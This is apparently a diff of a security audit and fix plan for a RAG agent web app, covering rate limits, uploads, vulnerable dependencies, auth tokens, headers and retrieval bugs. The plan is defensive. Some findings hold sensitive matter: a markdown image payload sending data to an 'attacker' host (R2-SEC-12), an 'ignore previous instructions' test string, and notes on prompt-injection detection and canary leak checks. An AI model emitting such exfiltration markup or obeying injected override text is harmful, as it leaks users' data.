-    1. New migration: delete duplicate rows keeping the lowest `tokens_remaining` per `user_id`; `ALTER TABLE rate_limit_buckets DROP CONSTRAINT unique_user_ip;` then `ADD CONSTRAINT rate_limit_buckets_user_id_key UNIQUE (user_id);`. Drop `client_ip` from the table (it is informational only).
-    2. Replace `get_or_create_rate_limit` + `decrement_rate_limit` with one atomic statement keyed only by `user_id`:
-        ```sql
-        INSERT INTO rate_limit_buckets (user_id, tokens_remaining, bucket_capacity, last_replenished_at)
-        VALUES ($1, $2 - 1, $2, NOW())
-        ON CONFLICT (user_id) DO UPDATE SET
-          tokens_remaining = CASE WHEN rate_limit_buckets.last_replenished_at <= NOW() - INTERVAL '1 hour'
-                                  THEN rate_limit_buckets.bucket_capacity - 1
-                                  ELSE rate_limit_buckets.tokens_remaining - 1 END,
-          last_replenished_at = CASE WHEN rate_limit_buckets.last_replenished_at <= NOW() - INTERVAL '1 hour'
-                                     THEN NOW() ELSE rate_limit_buckets.last_replenished_at END
-        WHERE rate_limit_buckets.tokens_remaining > 0
-           OR rate_limit_buckets.last_replenished_at <= NOW() - INTERVAL '1 hour'
-        RETURNING tokens_remaining;
-        ```
-        `NULL` result → 429.
-    3. Update `get_quota` and `refund` to key by `user_id` only. Remove the `client_ip` parameter from those signatures.
-    4. Keep `guest_ip_llm_limiter` as a second, per-IP guard for guests.
-- **Verify:** Test: consume a guest's 5 tokens from IP A, then call from IP B. Expect 429.
+    1. New migration `20261103000000_document_constraints.sql`: first remove existing duplicates (`DELETE FROM documents d USING documents d2 WHERE d.user_id = d2.user_id AND d.sha256_hash = d2.sha256_hash AND d.uploaded_at > d2.uploaded_at;` chunks cascade), then `CREATE UNIQUE INDEX IF NOT EXISTS idx_documents_user_hash ON documents(user_id, sha256_hash) WHERE user_id IS NOT NULL;`.
+    2. In `NeonDatabase.create_document_with_chunks`, inside the existing transaction and **before** the insert, take `SELECT pg_advisory_xact_lock(hashtext($1::text))` on the user id, re-count the user's documents, and raise a new `DocumentLimitReached` exception when the limit is hit. Catch `asyncpg.UniqueViolationError` and return the existing document (the same behaviour as the dedup branch).
+    3. In the route map `DocumentLimitReached` to the existing `409` response. Keep the early count check as a cheap fast path, then **delete** `_UPLOAD_LOCKS`, `_get_upload_lock` and the `409 Upload already in progress` branch (YAGNI once the DB is the authority). Remove the tests that only cover the lock and replace them with a concurrency test.
+- **Verify:** `db` test: fire 5 concurrent uploads of different files for a user with `MAX_DOCUMENTS_PER_USER - 1` documents; exactly one succeeds, the rest get `409`. Second test: two concurrent uploads of the same file produce exactly one row.
 
-### SEC-03 · High · Upload cost amplification and event-loop blocking
+### R2-SEC-08 · Medium · Vulnerable dependencies
 
-- **Where:** `apps/backend/app/routes/documents.py:104-222`; `apps/backend/app/rag/parser.py:103-192`; `apps/backend/app/rag/embeddings.py:31-84`.
-- **Problem:** One upload costs one quota token. A 5 MB file at 800-char chunks with 100 overlap gives about 7,500 chunks, which is about 75 sequential `batchEmbedContents` calls (10 s timeout each). `parse_markdown` is synchronous CPU work inside an `async def` route, so it blocks every other request on the worker while it runs. `README.md:109` says to run a single worker, so one upload can stall the whole API.
+- **Where:** `apps/frontend/package.json`, `pnpm-lock.yaml`, `apps/backend/pyproject.toml`, `apps/backend/uv.lock`.
+- **Problem:** `pnpm audit --prod` reports 4 critical and 5 high. Highlights: `next@16.3.4` (RCE in `next/og`, in the Image Optimization API with SVG, in `use cache`; DoS in Server Actions; SSRF in image optimization; patched in `>=16.4.1`), `dompurify` pinned at `3.2.6` plus a second copy under `mermaid` (many bypasses, patched in `>=3.4.17`), `katex <0.18.2`, `sharp`, `source-map-js`. The app does not use `next/og` or `use cache`, but the image endpoint is on by default, so patch anyway. Backend: `pyjwt 2.13.0` (15 advisories, the auth library; fixed `>=2.15.0`), `pillow 12.3.0` (39 advisories, fixed in 13.0.0), `aiohttp`, `certifi`, `dnspython`, `nltk`, `setuptools`, `opentelemetry-api`.
+  **Caveat:** `pip-audit` ran against the local `.venv`, which also contains `fastmcp`, `authlib` and `langgraph-sdk` that are **not** in `uv.lock`. The venv has drifted from the lockfile. Re-run the audit after `uv sync --frozen`.
 - **Fix:**
-    1. Lower `MAX_FILE_BYTES` to 1 MB (`documents.py:33` and `page.tsx:20`; see CLN-11 for sharing the constant).
-    2. Add `MAX_CHUNKS_PER_DOCUMENT = 400` in `config.py`. After parsing, if `len(chunks)` is over the cap, return 413 with a clear message.
-    3. Run parsing off the loop: `chunks = await asyncio.to_thread(default_markdown_parser.parse_markdown, ...)`.
-    4. Charge quota by size: `cost = max(1, ceil(len(chunks) / 100))`. Add `check_and_consume(..., cost=n)` support to the limiter (decrement by `n`, fail if fewer than `n` remain).
-    5. Allow one concurrent upload per user: keep an `asyncio.Lock` per `user_id` in a bounded dict, and return 409 "Upload already in progress" if it is held.
-- **Verify:** Test with a generated 1.5 MB file → 413. Test that a file producing 401 chunks → 413. Test that two parallel uploads by the same user → the second gets 409.
+    1. Frontend: `pnpm --filter @nexusagent/frontend up next@latest` (must be `>=16.4.1`), set `dompurify` to `^3.4.17`, and add a `pnpm.overrides` / `overrides` entry in `pnpm-workspace.yaml` forcing `dompurify@<3.4.17` to `3.4.17` so the copy under `mermaid` is fixed too. Run `pnpm up mermaid katex`. Run `pnpm audit --prod` until no critical/high remain.
+    2. Backend: `cd apps/backend && uv lock --upgrade-package pyjwt --upgrade-package pillow --upgrade-package aiohttp --upgrade-package certifi --upgrade-package dnspython --upgrade-package nltk --upgrade-package setuptools --upgrade-package opentelemetry-api`, then `uv sync --frozen`, then re-run `uv run --with pip-audit pip-audit --skip-editable`. Set `pyjwt[crypto]>=2.15.0` in `pyproject.toml`.
+    3. Run the full test suites. If a major bump breaks something, fix the break; do not pin back.
+    4. Add the audit job from R2-OPS-04 so this does not regress.
+- **Verify:** `pnpm audit --prod --audit-level=high` exits 0; `pip-audit` reports nothing for `pyjwt`; all gates green.
 
-### SEC-04 · Medium · Token in `localStorage` + CSP `'unsafe-inline'`; no revocation; endless refresh
+### R2-SEC-09 · Low · API response hardening
 
-- **Where:** `apps/frontend/lib/auth-store.ts:133-136,167-171`; `apps/frontend/next.config.ts:17` (`script-src 'self' 'unsafe-inline'`); `apps/frontend/app/layout.tsx:56-60` (inline theme script); `apps/backend/app/routes/auth.py:105-135`; `apps/backend/app/core/auth.py:38-50`.
-- **Problem:**
-    - Any XSS can read the 24 h bearer token from `localStorage`. `'unsafe-inline'` removes CSP's protection against injected inline scripts.
-    - Logout only clears the browser, so a stolen token stays valid for 24 h.
-    - `/auth/refresh` reissues a fresh 24 h token from any valid token with no maximum session age, so a stolen token can be renewed indefinitely.
-    - Guest tokens are refreshed with `ACCESS_TOKEN_EXPIRE_MINUTES`, not `GUEST_TOKEN_EXPIRE_MINUTES`.
-- **Fix (KISS, no cookie migration needed):**
-    1. Add a new migration with `ALTER TABLE users ADD COLUMN token_version INT NOT NULL DEFAULT 0;`. Put `"tv": user.token_version` and `"auth_time"` (first-login epoch) in every token. In `get_current_user`, reject the token when `payload["tv"] != user.token_version`.
-    2. Add `POST /api/auth/logout`, which increments `token_version`. Call it from `useAuthStore.logout` before clearing storage (fire-and-forget).
-    3. In `/auth/refresh`, keep `auth_time` from the old token. Reject with 401 if `now - auth_time > 7 days`.
-    4. Remove `'unsafe-inline'` from `script-src` in production. Next 16 supports per-request nonces through `proxy.ts`/middleware; give the theme script in `layout.tsx` that nonce. Alternatively remove the inline script and set the `dark` class from a blocking external `/theme-init.js` served from `public/`.
-    5. Add `iss` and `aud` claims (e.g. `nexusagent-api`) and validate them in `decode_access_token`.
-- **Verify:** Test: logout, then reuse the old token → 401. Test: refresh a token whose `auth_time` is 8 days old → 401. In a production build, the response CSP header contains no `'unsafe-inline'` in `script-src`.
+- **Where:** `apps/backend/app/main.py`, `app/config.py` (`CORS_ORIGINS` default).
+- **Problem:** (a) API responses carry no `X-Content-Type-Options: nosniff`, and auth responses (tokens in JSON) carry no `Cache-Control: no-store`. (b) The default `CORS_ORIGINS` includes `http://localhost:3000` and `http://127.0.0.1:3000` even when `ENVIRONMENT=production`.
+- **Fix:** (a) Add a small `@app.middleware("http")` (or a pure-ASGI one) that sets `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer` on every response, and `Cache-Control: no-store` when the path starts with `/api/auth/`. (b) Make the default `CORS_ORIGINS` the production origin only; add the localhost origins in the `model_validator` when `is_dev`.
+- **Verify:** Test that `/api/health` has `nosniff`, `/api/auth/guest` has `no-store`, and that `Settings(ENVIRONMENT="production", ...)` has no localhost origin while `development` does.
 
-### SEC-05 · Medium · Upload validation gaps
+### R2-SEC-10 · Low · HSTS `preload` and `includeSubDomains` hard-coded
 
-- **Where:** `apps/backend/app/routes/documents.py:123-161`.
-- **Problem:**
-    - `if ext not in ALLOWED_EXTENSIONS and file.content_type not in ALLOWED_MIME_TYPES` accepts a file when _either_ check passes, and `content_type` is chosen by the client. Any binary file sent as `text/plain` is accepted.
-    - The `latin-1` fallback never raises, so binary content is stored as garbage text, and the `except UnicodeDecodeError` branch at `:157` is dead.
-    - `filename` is unbounded, but `documents.filename` is `VARCHAR(255)`, so a long name causes an asyncpg error and a 500.
-    - `mime_type` is persisted from the client header.
-- **Fix:**
-    1. Require the extension to be in the allowed set (use `and`-logic: reject if `ext not in ALLOWED_EXTENSIONS`). Ignore the client MIME type and store `text/markdown` or `text/plain` derived from the extension.
-    2. Decode strictly as UTF-8 (accept and strip a BOM). On failure return 415. Reject content containing `\x00`.
-    3. Sanitise the filename: `os.path.basename`, strip control characters, truncate to 200 characters, and fall back to `uploaded_document.md` if empty.
-- **Verify:** Tests: a `.png` sent with `content_type=text/plain` → 415; a file containing NUL bytes → 415; a 300-character filename → 200 with a truncated filename.
+- **Where:** `apps/frontend/next.config.ts`, `securityHeaders`.
+- **Problem:** `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` is sent on every deployment, including previews. `preload` is a commitment for the whole registrable domain and is meant to be opt-in; `includeSubDomains` on `nexusagent.avinaba.com` is harmless today but is a trap for the other `avinaba.com` services the privacy page mentions.
+- **Fix:** Send `max-age=31536000` only. Add `includeSubDomains; preload` behind an explicit env flag (`HSTS_PRELOAD=true`) that is off by default. Do not send HSTS at all when `NODE_ENV !== 'production'`.
+- **Verify:** Unit test of the header builder (extract a tiny function) for the three cases.
 
-### SEC-06 · Medium · MCP arguments are not schema-validated
+### R2-SEC-11 · Low · Guest `deviceId` unbounded; weak fallback RNG
 
-- **Where:** `apps/backend/app/mcp/registry.py:191-198`; `apps/backend/app/mcp/dispatch.py:42-50`; `apps/backend/app/core/audit_log.py:40-81`.
-- **Problem:**
-    - `AGENTs.md §3.4` requires Pydantic-validated tool arguments. `int(arguments.get("limit", 5))` raises `ValueError` on `"abc"`, which surfaces as a generic internal error.
-    - If `arguments` is not a dict (e.g. a list), `.get` raises `AttributeError`.
-    - `query` has no length limit (`/rag/search` caps it at 1000).
-    - The raw `arguments` dict, of any size, is written to `tool_audit_logs.input_args` (JSONB) and to the in-memory ring.
-- **Fix:**
-    1. Define `class HybridRagSearchArgs(BaseModel): query: str = Field(min_length=1, max_length=1000); limit: int = Field(5, ge=1, le=20)`, with `model_config = ConfigDict(extra="forbid")`.
-    2. Generate `ToolDefinition.inputSchema` from `HybridRagSearchArgs.model_json_schema()` so the schema and the validation cannot drift.
-    3. In `call_tool`, validate with `model_validate(arguments)`. On `ValidationError` return a JSON-RPC `INVALID_PARAMS` error (-32602) with the field errors.
-    4. Store only the validated, bounded args in the audit log.
-- **Verify:** Tests: `{"limit":"abc"}` → -32602; `arguments=[]` → -32602; a 5,000-character query → -32602.
+- **Where:** `app/db/models.py::GuestPassRequest`, `apps/frontend/lib/auth-store.ts::getOrCreateDeviceId`.
+- **Problem:** The device id is the credential that re-opens a guest account. The backend accepts any length. The frontend falls back to `Math.random().toString(36)` (about 50 bits, predictable) when `crypto.randomUUID` is missing (insecure contexts).
+- **Fix:** `deviceId: str | None = Field(default=None, min_length=16, max_length=128)`. In the frontend, build the fallback from `crypto.getRandomValues(new Uint8Array(16))` hex-encoded, and if neither crypto API exists return `''` so the server generates one.
+- **Verify:** Backend test: a 10 000-character `deviceId` returns `422`. Frontend test of the fallback path with `crypto.randomUUID` stubbed away.
 
-### SEC-07 · Medium · Prompt-injection detection on the user query does nothing
+### R2-SEC-12 · Low · Markdown renderer relies on CSP alone to block image exfiltration
 
-- **Where:** `apps/backend/app/agent/graph.py:177-183`; `apps/backend/app/agent/state.py:72-74`; `apps/backend/app/routes/agent.py:193-213`.
-- **Problem:**
-    - `planner_node` sets `injection_detected`/`injection_reason`, but nothing reads them. The query is still sent to the LLM, and the flag is not included in any SSE event. The TODO board claims retrieved-chunk injections "surface an observability warning" (`target/TODOs.md:122`); they do not.
-    - The regex list also drops legitimate retrieved chunks that merely _mention_ "system prompt" or "jailbreak". For a security-architecture knowledge base this is a silent false positive.
-- **Fix (pick one, then document it in `ARCHITECTURE.md §10.1`):**
-    - **Option A (recommended, KISS):** treat regexes as telemetry only. Remove the user-query scan from `planner_node` and the dead state fields. Keep the chunk scan, but instead of dropping a chunk, keep it wrapped and add `injectionWarnings: [{filename, reason}]` to the `tool_result` and `done` SSE payloads. Show a small warning in the observability panel.
-    - **Option B:** block. When the user query matches, short-circuit like `out_of_scope` with a fixed refusal and do not consume quota.
-- **Verify:** Test: a retrieved chunk containing "ignore previous instructions" produces a non-empty `injectionWarnings` in `done`.
-
-### SEC-08 · Medium · Google identity keyed on email; `tokeninfo` endpoint
-
-- **Where:** `apps/backend/app/core/auth.py:215-267`; `apps/backend/app/db/neon.py:109-140`.
-- **Problem:** Accounts are upserted `ON CONFLICT (email)`, and the verified `sub` is returned and then discarded. Emails can change or be recycled (for example, Workspace accounts deleted and recreated), so a new person with the same address inherits the old account's history. Google recommends verifying ID tokens locally against its JWKS rather than calling `tokeninfo` on every login, which is an extra network dependency and was designed as a debugging endpoint.
-- **Fix:**
-    1. New migration: `ALTER TABLE users ADD COLUMN google_sub VARCHAR(255) UNIQUE;`.
-    2. Upsert on `google_sub`. On first login, if a row exists with the same email and `google_sub IS NULL`, attach the `sub` to it (one-time backfill).
-    3. Verify with `google-auth` (`google.oauth2.id_token.verify_oauth2_token(token, requests.Request(), GOOGLE_CLIENT_ID)`) in a thread, or with PyJWT plus a cached `PyJWKClient("https://www.googleapis.com/oauth2/v3/certs")`. Keep the `iss`, `aud` and `email_verified` checks.
-- **Verify:** Test: two logins with the same email but different `sub` produce two distinct user rows.
-
-### SEC-09 · Low · Unbounded in-memory sliding-window counters
-
-- **Where:** `apps/backend/app/core/rate_limiter.py:31-55`.
-- **Problem:** `_events` adds a key for every IP it sees and never removes it. Each key holds a list of datetimes. Traffic from many IPs grows memory without bound.
-- **Fix:** When `len(self._events) > 50_000`, drop keys whose newest event is older than `window`. Also drop a key when its `recent` list becomes empty.
-- **Verify:** Unit test: insert 60,000 keys with timestamps two hours old, then call `hit` once; the dict shrinks below 50,000.
-
-### SEC-10 · Low · MCP results returned without untrusted-content handling
-
-- **Where:** `apps/backend/app/mcp/registry.py:218-233`.
-- **Problem:** Chunks go to external agents (Claude Desktop, Cursor) as raw text, without `sanitize_retrieved_chunks` or `wrap_untrusted_context`. Only seeded documents are searched today, so the risk is low. It becomes real if user uploads are ever exposed through MCP.
-- **Fix:** Run `sanitize_retrieved_chunks(results)` and return the wrapped contexts (`<untrusted_document_context …>`) in the tool's text content.
-- **Verify:** Test: the tool output contains `<untrusted_document_context`.
-
-### SEC-11 · Low · Production exposes API docs and DB fingerprint
-
-- **Where:** `apps/backend/app/main.py:44-46`; `apps/backend/app/routes/health.py:35-47`.
-- **Problem:** `/docs`, `/redoc` and `/openapi.json` are public in production. The public `/api/health` returns the exact PostgreSQL version, installed extensions and the environment name.
-- **Fix:**
-    1. Set `docs_url`, `redoc_url` and `openapi_url` to `None` unless `settings.ENVIRONMENT in ("development", "test")`.
-    2. Have `/api/health` return only `{"status", "database": {"connected"}}`. Move version and extension details behind development mode.
-- **Verify:** With `ENVIRONMENT=production`, `/docs` returns 404 and `/api/health` has no `engine` or `extensions` keys. Update `tests/test_main.py` to match.
-
-### SEC-12 · Medium · Privacy policy and Terms contradict the code
-
-- **Where:** `apps/frontend/app/privacy/page.tsx`, `apps/frontend/app/terms/page.tsx`.
-- **Problem:** Statements that do not match the code:
-    - "client-side cryptographic isolation". There is none.
-    - "transient execution traces are automatically pruned after 24 hours" and "logs … without long-term server-side archival". In fact `tool_audit_logs` stores every query text (`input_args`) indefinitely. Guest pruning only sets `user_id` to NULL, and the text remains.
-    - "an isolated user partition". Isolation is an application-level `WHERE` clause; there is no RLS or separate schema.
-    - It does not say that IP addresses are also stored for Google users, or that a hashed device ID is stored for guests.
-    - It does not say whether Gemini API inputs may be used by Google. On the Gemini API free tier, Google may use prompts to improve its products. The policy must name the tier in use.
-    - Cloudflare edge rate limiting is not configured anywhere in this repo.
-    - Terms §3 mentions "read-only database queries" as an agent tool, which no longer exists.
-- **Fix:** Rewrite both pages to describe what the code actually does, using the bullets above. Add an `updated` date. If the deployment uses the Gemini free tier, say so explicitly, or switch to a paid tier. This is a legal-accuracy fix; keep the wording plain.
-- **Verify:** The verifier re-reads both pages against `audit_log.py`, `neon.py` and `auth.py`.
-
-### SEC-13 · Low · Audit log "immutable" only by convention; raw prompts kept forever
-
-- **Where:** `apps/backend/app/core/audit_log.py`; `migrations/20260901000000_core_schema.sql:98-109`; `README.md:117-123`.
-- **Problem:** Nothing prevents `UPDATE` or `DELETE` on `tool_audit_logs`; the README asks the operator to `REVOKE` by hand. Full user prompts are stored with no retention limit.
-- **Fix:**
-    1. New migration: a `BEFORE UPDATE OR DELETE ON tool_audit_logs` trigger that raises an exception, except for a retention function run by the prune script.
-    2. Store `query_sha256` and `query_len` instead of the raw query in `input_args` for `hybrid_rag_search`. Alternatively, keep the raw query and add `DELETE FROM tool_audit_logs WHERE executed_at < NOW() - INTERVAL '30 days'` to `scripts/prune_guests.py`.
-    3. Choose one option and state it in the privacy policy (SEC-12).
-- **Verify:** A db-marked test: `UPDATE tool_audit_logs …` raises.
-
-### SEC-14 · Low · CORS credentials and missing throttles
-
-- **Where:** `apps/backend/app/main.py:51-64`; `apps/backend/app/routes/auth.py`; `apps/backend/app/routes/chat.py`.
-- **Problem:**
-    - `allow_credentials=True` is unnecessary: auth uses an `Authorization` header and no cookies are used.
-    - `/auth/google` (outbound call to Google), `/auth/refresh`, `/chat/history?q=` (an unindexed `ILIKE` over all message content) and `/documents` have no throttling.
-- **Fix:**
-    1. Set `allow_credentials=False`.
-    2. Add a per-IP `SlidingWindowCounter` for `/auth/google` (e.g. 20/h) and `/auth/refresh` (e.g. 60/h).
-    3. Cap `q` at 200 characters in `/chat/history`.
-- **Verify:** Test: the 21st `/auth/google` call in an hour from one IP → 429.
+- **Where:** `apps/frontend/components/canvas/MarkdownRenderer.tsx`, `components` map.
+- **Problem:** `![x](https://attacker/?d=...)` in model output renders an `<img>`. Today the CSP `img-src` blocks it, but a CSP change or a deployment without `proxy.ts` would turn this into a data exfiltration channel (prompt injection is a stated threat).
+- **Fix:** Add `img: () => null,` to the `components` map (the app shows no images in answers).
+- **Verify:** Test in `MarkdownRenderer.test.tsx`: content `![a](https://example.com/x.png)` renders no `<img>`.
 
 ---
 
 ## 3. Logic and correctness findings
 
-### LOG-01 · High · Fake streaming; TTFT metric is false
+### R2-LOG-01 · High · Upload: embedding failure is an unhandled 500 and quota is not refunded
 
-- **Where:** `apps/backend/app/agent/graph.py:446` (`await llm_chain.ainvoke(messages)`); `apps/backend/app/routes/agent.py:163-177`; `apps/frontend/hooks/useAgentStream.ts:192-199`; `apps/frontend/components/observability-panel.tsx:69`.
-- **Problem:**
-    - The synthesizer waits for the _complete_ LLM response. The route then splits it on spaces and emits 3-word `token` events with `sleep(0.01)`.
-    - The UI's "First token" tile therefore measures the full model latency plus replay, which contradicts the project's "No Simulated Telemetry Rule" and the "sub-600ms TTFT" goal.
-    - `done` repeats the whole response, doubling the payload.
+- **Where:** `apps/backend/app/routes/documents.py::upload_document` (`await default_embedding_service.get_embeddings(texts)`), `app/rag/embeddings.py`, `app/core/rate_limiter.py::refund`, `app/db/neon.py::refund_rate_limit`.
+- **Problem:** `get_embeddings` raises `RuntimeError` on any HTTP error, timeout or short batch. The route never catches it, so the client gets a bare `500`, and the quota (`cost` tokens, charged just before) is lost. The Gemini free tier rate-limits embeddings routinely, so this is a common path. There is also no retry, a new `httpx.AsyncClient` per call, and batches run sequentially with a 10 s timeout each. `refund_rate_limit` can only return 1 token.
 - **Fix:**
-    1. Split the synthesizer into "build messages" (pure function: `build_synthesis_messages(state) -> list[BaseMessage]`) and "generate".
-    2. Use `astream_events(..., version="v2")` on the compiled graph, or call `llm_chain.astream(messages)` inside the synthesizer node and push each `AIMessageChunk.content` to an `asyncio.Queue` passed through `RunnableConfig["configurable"]`. The route forwards each real chunk as a `token` event.
-    3. Delete the word-splitting loop and the `sleep`.
-    4. Keep `done` but drop `response` from it (the client already has the text). Keep the canary check: accumulate the text and, if the canary appears, emit an `error`/`redact` event telling the client to replace the text.
-    5. The canary check now runs after tokens have been shown. Document that the canary detects leaks; it does not prevent display. Alternatively, buffer and scan a sliding window of the last `len(canary)` characters before forwarding each chunk.
-- **Verify:** Mock the LLM so `astream` yields 3 chunks with 200 ms gaps. The test receives the first `token` event in under 300 ms, and the total number of `token` events is 3.
+    1. `embeddings.py`: introduce `class EmbeddingUnavailable(RuntimeError)`; raise it instead of the bare `RuntimeError` (it is a subclass, so `hybrid_search` keeps working). Retry up to 2 more times with 0.5 s then 1.5 s backoff on `429` and `5xx` only. Reuse one module-level `httpx.AsyncClient` (create lazily, close in `lifespan`).
+    2. `refund_rate_limit(user_id, amount=1)`: `LEAST(tokens_remaining + $2, bucket_capacity)`. `TokenBucketLimiter.refund(user_id, amount=1)`; also delete the unused `is_guest` parameter.
+    3. `upload_document`: wrap everything after `check_and_consume` (embedding and `create_document_with_chunks`) in `try/except`. On `EmbeddingUnavailable` refund `cost` and raise `HTTPException(503, "Embedding service is busy. Nothing was charged; try again in a minute.")` with `Retry-After: 30`. On any other exception refund `cost` and re-raise.
+- **Verify:** Test with `get_embeddings` patched to raise `EmbeddingUnavailable`: response is `503` with the message above and the user's remaining quota equals the value before the call. Test for the retry (first two calls `429`, third `200`) in `test_hybrid_search.py` using `httpx.MockTransport`.
 
-### LOG-02 · Medium · Conversation title overwritten on every turn
+### R2-LOG-02 · Medium · Scope guardrail refuses follow-ups and many valid architecture questions
 
-- **Where:** `apps/backend/app/db/neon.py:515-533` (`ON CONFLICT (id) DO UPDATE SET title = EXCLUDED.title`); called from `apps/backend/app/routes/agent.py:223-224` with the _current_ query as the title.
-- **Problem:** Every follow-up renames the conversation to the latest question. The sidebar list then appears to reshuffle titles.
-- **Fix:** Change the conflict clause to `ON CONFLICT (id) DO UPDATE SET updated_at = CURRENT_TIMESTAMP WHERE agent_conversations.user_id = EXCLUDED.user_id`, leaving the title untouched. Keep `RETURNING`.
-- **Verify:** Test: two turns with different queries in one session; the title equals the first query.
-
-### LOG-03 · Medium · `done` sent before persistence; disconnect cancels the save
-
-- **Where:** `apps/backend/app/routes/agent.py:192-242,258-268`; `apps/frontend/app/page.tsx:348` (`void loadConversations(true)` right after `done`).
-- **Problem:**
-    1. The client refetches `/chat/history` as soon as it gets `done`, but the server writes the conversation _after_ emitting `done`. The fresh list can miss the new conversation and overwrite the optimistic entry, so the chat vanishes from the sidebar until the next refresh.
-    2. If the client disconnects after `done` (tab closed, Stop pressed), the generator's `finally` cancels `pipeline_task` and the turn is never saved.
+- **Where:** `apps/backend/app/agent/graph.py::classify_query_intent`, `ARCHITECTURE_KEYWORDS`; `app/routes/agent.py::stream_agent_execution` and `generate_agent_stream` (classifies twice).
+- **Problem:** (a) Intent is computed from the current message only. In a saved conversation, "explain that in more detail", "why?", "show it as a diagram" are classified `out_of_scope` and answered with the refusal, even though the product advertises multi-turn context. (b) The keyword list is exact-word (plus optional `s`), so "scalable", "leader election", "B-tree vs LSM", "Postgres vs MySQL isolation levels", "idempotency" are refused. (c) The query is classified twice (once in the route for metering, once in `generate_agent_stream`).
 - **Fix:**
-    1. Move persistence _before_ the `done` event and include `conversationId` in `done`.
-    2. Run persistence in a shielded task (`await asyncio.shield(persist())`) so a disconnect cannot cancel it.
-    3. In `page.tsx`, drop the immediate `loadConversations(true)`. The optimistic update plus `conversationId` from `done` is enough. Optionally refetch after 1 s.
-- **Verify:** Test: read the SSE stream until `done`, then immediately `GET /chat/history`; the conversation is present.
+    1. `classify_query_intent(query: str, *, has_history: bool = False) -> Intent`. If the keyword/greeting check says `out_of_scope` **and** `has_history` **and** the query has at most 25 words, return `"architectural"` (it is metered like any question).
+    2. In `stream_agent_execution`, load `chat_history` **first**, then compute `intent = classify_query_intent(payload.query, has_history=bool(chat_history))` once, use it for the metering decision, and pass it into `generate_agent_stream(..., intent=intent)`. Delete the second call inside `generate_agent_stream` (`intent=classify_query_intent(query)`).
+    3. Add this sentence to `ANALYSIS_PROMPT`: "If the latest user message is unrelated to systems architecture, distributed systems or AI model benchmarks and is not a follow-up to the conversation, decline in one sentence."
+    4. Extend `ARCHITECTURE_KEYWORDS` with stems and terms (the regex already allows a trailing `s`; for stems add a trailing `\w*` variant): `scalab`, `leader election`, `election`, `b-tree`, `lsm`, `index`, `transaction`, `isolation`, `idempoten`, `eventual`, `partition`, `rate limit`, `throttl`, `queue`, `postgres`, `mysql`, `sql`, `nosql`, `observab`, `kubernetes`, `docker`, `latency`, `throughput`, `trade-off`, `tradeoff`.
+- **Verify:** Table-driven test with at least 20 in-scope and 10 out-of-scope prompts (out of scope: "write a poem", "capital of France", "recipe for pasta", ...). Test that with `has_history=True`, "explain that in more detail" is `architectural`, and without history it is `out_of_scope`. Test that a single request calls the classifier once.
 
-### LOG-04 · High · Embedding fallback mixes vector spaces
+### R2-LOG-03 · Medium · HNSW + `WHERE` filter can silently under-return rows
 
-- **Where:** `apps/backend/app/rag/embeddings.py:11,24,50,69`.
-- **Problem:** `GEMINI_EMBED_MODELS = ["gemini-embedding-001", "gemini-embedding-2", "text-embedding-004"]`. If the first model returns 404, the next one is used and becomes `active_model` for the process. Vectors from different models live in unrelated spaces, so cosine similarity between them is meaningless, and the documents table does not record which model produced each vector. A fallback silently corrupts dense retrieval for every document embedded before or after the switch. The mutable `active_model` is also shared process state.
+- **Where:** `apps/backend/app/db/neon.py::search_chunks_dense`.
+- **Problem:** pgvector applies the HNSW index first (default `ef_search = 40`) and filters afterwards. With a growing seeded corpus plus per-user documents, the 40 nearest candidates may all belong to other documents or the wrong `embedding_model`, so a user's own document returns **zero** dense results although it is relevant. The system then degrades to lexical-only without any signal.
+- **Fix:** Run the query in a transaction and enable iterative scans (pgvector `>=0.8`):
+
+    ```python
+    async with pool.acquire() as conn, conn.transaction():
+        await conn.execute("SET LOCAL hnsw.iterative_scan = 'relaxed_order'")
+        await conn.execute("SET LOCAL hnsw.max_scan_tuples = 20000")
+        rows = await conn.fetch(query, *params)
+    ```
+
+    First confirm the version: `SELECT extversion FROM pg_extension WHERE extname = 'vector';`. If it is below `0.8.0`, instead `SET LOCAL hnsw.ef_search = 200` and note the limitation in `architecture.md`.
+
+- **Verify:** `db` test: insert 300 seeded chunks with random embeddings and 3 user chunks near a query vector; assert all 3 user chunks appear in `search_chunks_dense(user_id=...)`. Compare with the old code to confirm the test fails before the fix.
+
+### R2-LOG-04 · Medium · Chunk endpoints load every chunk with its embedding to return one
+
+- **Where:** `apps/backend/app/db/neon.py::get_document_chunks`; callers `routes/documents.py::get_document_chunks` and the dedup branch of `upload_document` (`existing_chunks[:5]`); frontend `SourceDialog.tsx`.
+- **Problem:** Opening one citation downloads all chunks of the document (up to 400, full text) and the database ships a 768-float vector per row, which the code then converts in a Python loop. The dedup path does the same just to take 5 previews.
 - **Fix:**
-    1. Use a single pinned model: `EMBEDDING_MODEL = "gemini-embedding-001"` in settings. Remove the fallback list and `active_model`.
-    2. On failure, raise. Callers already handle errors (upload → 503; search → see LOG-08).
-    3. New migration: `ALTER TABLE document_chunks ADD COLUMN embedding_model VARCHAR(64);`, filled on insert. Dense search filters `WHERE c.embedding_model = $model`.
-    4. Send `taskType`: `RETRIEVAL_DOCUMENT` for chunks and `RETRIEVAL_QUERY` for queries (`get_embeddings(texts, task_type=...)`). This is supported by `gemini-embedding-001` and improves retrieval quality.
-    5. Re-run `scripts/seed_kb.py` after the migration.
-- **Verify:** Unit test: a 404 from the model → `RuntimeError`, and no second model is tried. Test that the request payload contains `taskType`.
+    1. `get_document_chunks(document_id, limit: int | None = None)`: select without `embedding` and drop the vector-conversion block (the `DocumentChunk` validator already handles `None`). Use `LIMIT $2` when `limit` is given. The dedup branch passes `limit=5`.
+    2. New `get_document_chunk(document_id, chunk_id)` and route `GET /api/documents/{document_id}/chunks/{chunk_id}` returning one `DocumentChunkWire` (with the same `require_document_access` check, both ids typed as `UUID`).
+    3. `SourceDialog.tsx`: call the new endpoint, drop the `chunks.find(...)`.
+    4. Delete the list route `GET /api/documents/{id}/chunks`, `DocumentChunksResponseWire` and its contract type (nothing else consumes them). Run `pnpm contracts:generate`.
+- **Verify:** Update `test_documents.py` and `SourceDialog.test.tsx`. Assert a foreign user's chunk id returns `404`.
 
-### LOG-05 · Medium · Citation pipeline is inconsistent
+### R2-LOG-05 · Medium · Re-seeding changes chunk ids and breaks stored citations
 
-- **Where:** `apps/backend/app/agent/graph.py:258-272,377,408-425`; `apps/frontend/components/canvas/MarkdownRenderer.tsx:122-129,166-203,524-531`; `apps/frontend/components/workspace-sidebar.tsx:161-163`.
-- **Problem:**
